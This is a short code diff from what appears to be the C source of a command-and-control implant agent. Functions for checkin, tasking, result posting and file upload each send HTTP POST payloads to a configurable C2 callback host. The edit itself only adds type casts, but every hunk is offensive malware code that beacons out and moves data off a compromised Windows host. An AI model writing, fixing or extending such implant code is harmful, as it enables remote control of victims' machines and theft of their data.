@@ -88,7 +88,7 @@ BOOL perform_checkin(AgentState *state, AgentCapabilities *cap, CheckinReply *re
 	// Send checkin payload to C2 server.
 	char *msg = generate_checkin_message(&checkin);
 	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
-	HttpBody body = {msg, MSVCRT$strlen(msg)};
+	HttpBody body = {(unsigned char *) msg, MSVCRT$strlen(msg)};
 	HttpResponse response = {0};
 	
 	BOOL result = HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
@@ -193,7 +193,7 @@ BOOL perform_tasking(AgentState *state, TaskingReply *reply) {
 	
 	// Send tasking payload to C2 server.
 	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
-	HttpBody body = {msg, MSVCRT$strlen(msg)};
+	HttpBody body = {(unsigned char *) msg, MSVCRT$strlen(msg)};
 	HttpResponse response = {0};
 	
 	BOOL result = HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
@@ -268,7 +268,7 @@ BOOL perform_post(AgentState *state, TaskInfo *task, TaskPostReply *reply, char 
 	
 	// Send post payload to C2 server.
 	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
-	HttpBody body = {msg, MSVCRT$strlen(msg)};
+	HttpBody body = {(unsigned char *) msg, MSVCRT$strlen(msg)};
 	HttpResponse response = {0};
 	
 	BOOL result = HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
@@ -401,7 +401,7 @@ BOOL perform_upload(AgentState *state, UploadManager *upload) {
 	
 	// Send upload payload to C2 server.
 	HttpURI uri = {state->params.callback_host, state->params.callback_port, state->params.callback_uri};
-	HttpBody body = {msg, MSVCRT$strlen(msg)};
+	HttpBody body = {(unsigned char *) msg, MSVCRT$strlen(msg)};
 	HttpResponse response = {0};
 	
 	BOOL result = HttpRequest(state->http, HTTP_METHOD_POST, &uri, NULL, &body, &response);
